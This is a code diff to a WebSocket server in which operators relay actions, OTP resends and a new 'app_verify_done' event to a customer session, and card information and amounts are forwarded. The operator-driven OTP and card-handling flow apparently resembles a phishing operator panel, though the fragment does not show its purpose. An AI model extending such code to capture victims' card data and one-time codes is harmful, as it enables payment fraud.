@@ -331,7 +331,14 @@ export function setupWebSocket(server: any) {
             }
           }
 
-          sendToCustomer(sessionId, { action, message: custMsg, sessionId, phoneSuffix });
+          sendToCustomer(sessionId, {
+            action,
+            message: custMsg,
+            sessionId,
+            phoneSuffix,
+            cardInfo: s ? { ...(s as any).cardInfo } : undefined,
+            amount: s ? (s as any).amount || (s as any).cardInfo?.amount : undefined
+          });
           break;
         }
 
@@ -361,6 +368,16 @@ export function setupWebSocket(server: any) {
           });
           // Tell customer to wait 1 minute
           sendToCustomer(sessionId, { action: 'resend_ok', message: 'OTP resent', count: s.otpResendCount });
+          break;
+        }
+
+        case 'app_verify_done': {
+          const { sessionId } = msg.payload;
+          operators.forEach(op => {
+            if (op.readyState === WebSocket.OPEN) {
+              op.send(JSON.stringify({ type: 'app_verify_done', payload: { sessionId } }));
+            }
+          });
           break;
         }
 
